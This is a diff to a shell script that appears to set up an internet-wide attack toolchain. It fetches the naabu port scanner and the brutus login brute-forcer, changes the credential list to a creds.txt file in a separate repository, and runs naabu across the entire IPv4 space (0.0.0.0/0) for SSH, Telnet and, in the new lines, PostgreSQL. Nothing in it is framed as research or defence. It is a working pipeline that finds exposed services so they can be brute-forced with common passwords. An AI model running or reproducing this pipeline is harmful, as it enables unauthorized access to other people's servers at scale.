@@ -11,7 +11,8 @@
 go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
 url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
 url_brutus='https://github.com/praetorian-inc/brutus/releases/download/v1.10.0/brutus-linux-amd64.tar.gz' 
-creds='https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt'
+creds='https://github.com/atilabyte/golang/raw/refs/heads/master/creds.txt'
+
 
 
 
@@ -32,10 +33,13 @@ tar -xf brutus
 
 chmod  +x brutus 
 
-timeout  120s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #ssh
- 
 
-timeout  600s     ./nabu  -p 23   -host   0.0.0.0/0     >>    ips_nabu  #telnet
+timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu     #ssh
+
+timeout  600s     ./nabu  -p 23    -host   0.0.0.0/0     >>    ips_nabu  #telnet
+
+timeout  600s     ./nabu  -p 5432  -host   0.0.0.0/0     >>    ips_nabu  #telnet
+
 
 
 
